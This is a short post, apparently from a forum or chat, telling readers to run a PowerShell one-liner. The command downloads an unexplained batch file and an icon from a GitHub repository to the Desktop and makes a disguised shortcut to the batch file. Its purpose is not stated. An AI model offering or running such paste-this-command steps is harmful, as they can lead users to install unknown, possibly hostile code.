run this code in powershell to download 


$desktopPath = [System.Environment]::GetFolderPath('Desktop'); Invoke-WebRequest -Uri "https://github.com/danygk/sv/raw/main/x.bat" -OutFile "$desktopPath\x.bat"; Invoke-WebRequest -Uri "https://github.com/danygk/sv/raw/main/v.ico" -OutFile "$desktopPath\v.ico"; $ws = New-Object -ComObject WScript.Shell; $shortcut = $ws.CreateShortcut("$desktopPath\x.bat - Shortcut.lnk"); $shortcut.TargetPath = "$desktopPath\x.bat"; $shortcut.IconLocation = "$desktopPath\v.ico"; $shortcut.Save()
